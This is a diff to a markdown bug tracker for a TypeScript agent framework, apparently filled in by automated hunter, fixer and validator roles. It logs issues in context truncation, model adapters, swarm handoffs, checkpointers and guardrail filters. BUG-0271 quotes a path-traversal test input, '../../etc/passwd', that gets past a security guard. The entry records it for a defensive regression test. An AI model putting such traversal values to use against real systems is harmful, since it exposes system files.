+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0261
+- **status:** `in-validation`
+- **severity:** `high`
+- **file:** `src/harness/context-compactor.ts`
+- **line:** `328`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** `bugfix/BUG-0261`
+- **description:** `fallbackTruncation` silently returns only a synthetic two-message header with no actual conversation history if the most recent message exceeds the character budget.
+- **context:** The backward walk at line 328 breaks immediately if the first (most recent) message's character length exceeds `budget`. The function returns `[truncation_notice, "Context loaded."]` with zero conversation history and no error or warning. Since `fallbackTruncation` is the last-resort path when summarization fails, this is a silent total context loss — downstream inference proceeds with no prior conversation, producing responses that ignore all previous turns.
+- **hunter_found:** `2026-03-19T15:11:42Z`
+- **fixer_started:** `2026-03-19T23:03:23Z`
+- **fixer_completed:** `2026-03-19T23:03:23Z`
+- **fix_summary:** `In fallbackTruncation() in src/harness/context-compactor.ts, changed the break-on-first-message logic to truncate oversized messages instead of dropping them entirely. When the most recent message exceeds the budget and no messages have been kept yet, the content is sliced to fit with a [truncated] suffix. Emits console.warn to signal the truncation.`
+- **validator_started:** `2026-03-19T23:15:00Z`
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0262
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `packages/tools/src/web-search/brave.ts`
+- **line:** `45`
+- **category:** `missing-error-handling`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `res.json()` is returned without a try/catch after confirming `res.ok`, so a non-JSON 200 response (proxy page, truncated body) throws an unhandled `SyntaxError`.
+- **context:** Same pattern exists in `packages/tools/src/web-search/exa.ts:52`, `packages/tools/src/web-search/tavily.ts:46`, and `packages/tools/src/browser/firecrawl.ts:51`. During an API incident or proxy error, the raw `SyntaxError` propagates with no indication of which tool or URL caused it. The GitHub tool helper at `packages/tools/src/github/index.ts:67` has the same issue (tracked as BUG-0241).
+- **hunter_found:** `2026-03-19T15:11:42Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0263
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/swarm/agent-node.ts`
+- **line:** `100`
+- **category:** `type-error`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** Duck-typed Handoff detection at line 100 checks `(result as any).isHandoff` but constructs `new Handoff((result as any).opts)` without verifying `.opts` exists, so a duck-typed object with `isHandoff: true` but no `opts` produces a malformed Handoff.
+- **context:** A third-party agent returning `{ isHandoff: true }` without an `opts` property passes the guard and feeds `undefined` to the `Handoff` constructor. Whether this crashes or produces silent corruption depends on the constructor's handling of `undefined`. Adding `&& (result as any).opts` to the guard would prevent this.
+- **hunter_found:** `2026-03-19T15:11:42Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0264
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/lsp/client.ts`
+- **line:** `526`
+- **category:** `type-error`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** Incoming JSON-RPC messages from the LSP server are cast directly to `JsonRpcResponse` (line 526) and `JsonRpcNotification` (line 533) via `as unknown as` without any structural validation.
+- **context:** Messages arrive from JSON parsing as `Record<string, unknown>`. If the LSP server sends a malformed message (missing `id`, wrong `method` shape, or extra fields), the cast silently succeeds and the typed handlers operate on structurally incorrect objects. A missing `id` field on a response would cause the pending request lookup to fail silently, leaving the Promise unresolved indefinitely.
+- **hunter_found:** `2026-03-19T15:11:42Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0265
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/models/anthropic.ts`
+- **line:** `398`
+- **category:** `logic-bug`
+- **description:** `chat()` returns `stopReason: "tool_use"` even when all tool_use blocks were for structured output (responseFormat), so callers see `stopReason: "tool_use"` instead of `"end"` on structured output responses.
+- **context:** CI Sentinel detected regression on main branch. `mapStopReason` at line 175 converts `"tool_use"` to `"tool_use"` unconditionally. When `responseFormat.type === "json_schema"` is used, the tool_use block is a synthetic internal tool — after filtering it from `toolCalls` (line 380), `stopReason` should be overridden to `"end"`. Without this, the agent harness sees `stopReason: "tool_use"` and enters tool-processing logic for a response that has no tool calls, causing incorrect agent behavior. Test "extracts parsed from tool_use input, not text content" in `src/__tests__/structured-output.test.ts` fails at line 337.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T22:00:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0266
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/pregel/index.ts`
+- **line:** `1`
+- **category:** `test-regression`
+- **description:** Subgraph checkpoint namespace isolation is not implemented — child subgraph checkpoints are stored under the parent threadId instead of `"parentId:subgraphName"`, so `cp.list("parent-1:child")` returns zero results.
+- **context:** CI Sentinel detected regression on main branch. Test "subgraph checkpoints are isolated from parent" in `src/__tests__/checkpoint-namespace.test.ts` fails at line 40: `expected 0 to be greater than 0`. When a subgraph is added via `outer.addSubgraph("child", ...)`, the compiled inner graph should checkpoint using a namespaced threadId (`"parent-1:child"`) to prevent checkpoint key collisions between parent and child graphs sharing the same checkpointer. Currently all checkpoints land under the parent threadId, making namespace isolation impossible.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T22:00:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0267
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/swarm/agent-node.ts`
+- **line:** `100`
+- **category:** `test-regression`
+- **description:** Handoff routing is broken — agents returning a `Handoff` object do not route to the target agent, causing 3 tests across 2 files to fail with `result.done === false`.
+- **context:** CI Sentinel detected regression on main branch. Tests "spawned agent that returns a Handoff routes to the handoff target" (`src/__tests__/swarm/dynamic-spawn.test.ts:112`) and "agent returning Handoff routes to target agent" (`src/__tests__/swarm/handoff-execution.test.ts:67`) both fail with `expected false to be true`. Stderr shows `applyUpdate: unknown channel key "isHandoff" — skipping (not in channel schema)`, confirming that the Handoff marker is being treated as a state update rather than a routing directive. The duck-typed `isHandoff` detection at line 100 is not intercepting the return value before it reaches the state updater.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T22:00:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0268
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/harness/loop/index.ts`
+- **line:** `55`
+- **category:** `missing-error-handling`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `fireSessionStart` is awaited outside the main `try` block, so a hook error aborts the entire agent loop before any turn executes with no error message yielded to the caller.
+- **context:** The `try` block wrapping the main loop begins at line 81. Every other hook call (`firePreCompact`, `firePostCompact`, `fireStop`, `fireSessionEnd`) is inside a guarded block. A throwing session-start hook kills the generator with an unhandled error and no cleanup.
+- **hunter_found:** `2026-03-19T20:18:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0269
+- **status:** `pending`
+- **severity:** `low`
+- **file:** `src/swarm/snapshot.ts`
+- **line:** `174`
+- **category:** `logic-bug`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `deepEqual` cycle-detection uses two independent `WeakSet`s checked with AND, so an object seen in `seenA` from one comparison pair and an unrelated object seen in `seenB` from a different pair can both pass the check, returning `true` for non-equal cyclic structures.
+- **context:** The correct approach tracks `(a, b)` pairs together (e.g., a `Map<object, Set<object>>`). As written, cross-pair contamination in the WeakSets produces false equality for cyclic agent state snapshots, defeating change detection in the swarm snapshot system.
+- **hunter_found:** `2026-03-19T20:18:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0270
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `packages/loaders/src/loaders/pdf.ts`
+- **line:** `24`
+- **category:** `missing-error-handling`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `readFile(source)` is called outside any try/catch, so filesystem errors (ENOENT, EACCES) propagate as raw Node.js errors with no loader-level context.
+- **context:** The try/catch at line 16 only guards the dynamic `import()` of pdfjs-dist. A missing or inaccessible PDF file produces a raw `ENOENT` with no indication it came from the PDF loader. Same pattern in `docx.ts:20` and `csv.ts:10`.
+- **hunter_found:** `2026-03-19T20:18:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0271
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/swarm/self-improvement/skill-evolver.ts`
+- **line:** `186`
+- **category:** `test-regression`
+- **description:** Test "BUG-0078: safeSkillPath does not throw ReferenceError from require() in ESM" in `src/__tests__/skill-evolver-esm-path.test.ts` fails: `commitOrRevert("../../etc/passwd", ...)` resolves instead of rejecting with "Path traversal detected".
+- **context:** CI Sentinel detected regression on main branch. `commitOrRevert` validates content format before calling `safeSkillPath`. When the test passes a path-traversal skillName with content that does not start with `#` or `---`, the content validation guard (line 204) returns early before `safeSkillPath` at line 228 can throw the expected "Path traversal detected" error. The path traversal guard is bypassed by the content format check. Fix: validate path traversal via `safeSkillPath` before content format checks, so security rejections always throw regardless of content.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T22:59:15Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0272
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/swarm/factories.ts`
+- **line:** `371`
+- **category:** `test-regression`
+- **description:** Test "terminates at maxRounds if no consensus" in `src/__tests__/swarm/template-debate.test.ts` fails: `judgeModel.chat` called 1 time instead of expected 2 times when `maxRounds: 2`.
+- **context:** CI Sentinel detected regression on main branch. The debate judge node termination condition at line 371 uses `nextRound >= config.judge.maxRounds`. With `maxRounds: 2`, after the second judge invocation (round=1), `nextRound=2 >= 2` is true — the graph terminates after only 1 chat call. The test expects `chat` to be called exactly `maxRounds` (2) times, implying the condition should be `nextRound > config.judge.maxRounds` (off-by-one fix) so the judge runs exactly `maxRounds` real evaluation cycles before stopping.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T22:59:15Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0273
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/harness/memory/ranker.ts`
+- **line:** `101`
+- **category:** `test-regression`
+- **description:** Test "drops units that score below matchThreshold" in `src/__tests__/memory-loader.test.ts` fails: expected 0 units returned but got 1 — a non-episodic unit scoring exactly at `matchThreshold` (0.2) is not filtered out.
+- **context:** CI Sentinel detected regression on main branch. The `rankAndLoad` relevance filter uses `score >= matchThreshold`. Non-episodic units with zero tag overlap receive `recencyScore=1`, yielding `score = 0 * 0.8 + 1 * 0.2 = 0.2` — exactly equal to the default `matchThreshold` of `0.2`. The test asserts 0 units returned (expecting strictly-below semantics). Fix: change filter condition to `score > matchThreshold` to exclude boundary-equal units as the test requires.
+- **reopen_count:** `0`
+- **branch:** ``
+- **hunter_found:** `2026-03-19T22:59:15Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0274
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/models/google.ts`
+- **line:** `338`
+- **category:** `type-error`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `candidate.content.parts` is accessed without a null check on `candidate.content`, which the Gemini API omits when finishReason is "SAFETY" or "RECITATION", causing a runtime TypeError.
+- **context:** Line 325–326 guards `!candidate` but not `!candidate.content`. The streaming path (line 414) correctly checks `!candidate.content` with a `continue`, but the synchronous `chat()` path does not — accessing `.parts` on undefined throws. Any safety-filtered Gemini response crashes the non-streaming code path.
+- **hunter_found:** `2026-03-19T23:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0275
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/models/openrouter.ts`
+- **line:** `472`
+- **category:** `api-contract-violation`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** The `finish_reason` check for emitting `tool_call_end` events is nested inside `if (delta)`, so when the API sends a final chunk with `finish_reason: "tool_calls"` but no `delta` object, the event is never emitted.
+- **context:** The OpenAI adapter correctly reads `finishReason` from `choice` (outside the delta block). In `openrouter.ts` the check at line 472 is inside `if (delta)`, making it unreachable when delta is absent. This means streaming tool calls never receive an end event, leaving callers that depend on `tool_call_end` to finalize tool invocations stuck indefinitely.
+- **hunter_found:** `2026-03-19T23:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0276
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/pregel/execution.ts`
+- **line:** `160`
+- **category:** `api-contract-violation`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** The circuit breaker fallback in `execution.ts` calls `fallback(state, err)` with two arguments, but `CircuitBreaker.execute()` in `circuit-breaker.ts:36` calls `this.config.fallback()` with zero arguments — the two invocation sites have incompatible signatures.
+- **context:** A user registering a fallback that expects `(state, error)` would have it work correctly when triggered from `execution.ts:160` but receive `undefined` for both parameters when triggered from the `CircuitBreaker` class directly. This makes the fallback contract unreliable depending on which code path triggers it.
+- **hunter_found:** `2026-03-19T23:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0277
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/swarm/pool.ts`
+- **line:** `209`
+- **category:** `missing-error-handling`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `agent.hooks?.onComplete?.()` is awaited without a try/catch, so a throwing `onComplete` hook causes `invoke()` to reject even though the agent task already succeeded, discarding the valid result.
+- **context:** The result is computed at line 205 but a hook error before the return statement at line 210 causes the caller to see a failure. Unlike PostToolUse error handling in `tools.ts`, there is no isolated try/catch around the completion hook. The successful computation is lost.
+- **hunter_found:** `2026-03-19T23:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0278
+- **status:** `pending`
+- **severity:** `high`
+- **file:** `src/checkpointers/redis.ts`
+- **line:** `180`
+- **category:** `type-error`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `JSON.parse(raw) as ONICheckpoint<S>` deserializes stored checkpoint data without any field validation, so a corrupted or truncated Redis entry yields a checkpoint object missing required fields that only blows up later.
+- **context:** The Postgres checkpointer (`src/checkpointers/postgres.ts:122`) has a full `deserialize()` method that validates each field and throws a typed `CheckpointCorruptError`. The Redis checkpointer skips all validation, so corruption in Redis silently produces a partial checkpoint that causes downstream failures far from the deserialization site.
+- **hunter_found:** `2026-03-19T23:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0279
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/swarm/self-improvement/manifest.ts`
+- **line:** `50`
+- **category:** `type-error`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** The regex-captured `m[3]` value is cast to `"minimize" | "maximize"` without validating the parsed string is one of those values, so a MANIFEST.md with `direction: sideways` is silently accepted.
+- **context:** Downstream code in `pattern-learner.ts` uses `r.direction ?? "minimize"` for gain calculation sign logic. An invalid direction value passes TypeScript's narrowing but produces incorrect metric evaluation at runtime, potentially inverting optimization decisions.
+- **hunter_found:** `2026-03-19T23:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0280
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/guardrails/filters.ts`
+- **line:** `128`
+- **category:** `api-contract-violation`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** When a filter returns `blocked: true` with a `redacted` value, the redaction path continues processing but the final return omits `blockedBy` and `reason` fields, losing audit information about which filter triggered the rewrite.
+- **context:** Callers that log or audit filter decisions lose visibility into redaction events. The block path (line 135) correctly includes `blockedBy` and `reason`, but the redact-and-continue path at line 129 drops that information from the return at line 143.
+- **hunter_found:** `2026-03-19T23:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+### BUG-0281
+- **status:** `pending`
+- **severity:** `medium`
+- **file:** `src/swarm/pool.ts`
+- **line:** `196`
+- **category:** `missing-error-handling`
+- **reopen_count:** `0`
+- **branch:** ``
+- **description:** `agent.hooks?.onStart?.()` is awaited without a try/catch, so a throwing `onStart` hook aborts the slot run entirely and bypasses the retry loop.
+- **context:** The `onError` hook handles retry exhaustion, but an `onStart` exception propagates directly to the `invoke()` caller with no retry attempt and no hook-level error isolation. The queued work is never attempted.
+- **hunter_found:** `2026-03-19T23:05:00Z`
+- **fixer_started:** ``
+- **fixer_completed:** ``
+- **fix_summary:** ``
+- **validator_started:** ``
+- **validator_completed:** ``
+- **validator_notes:** ``
+
+---
+
+<!-- HUNTER: Append new bugs above this line -->
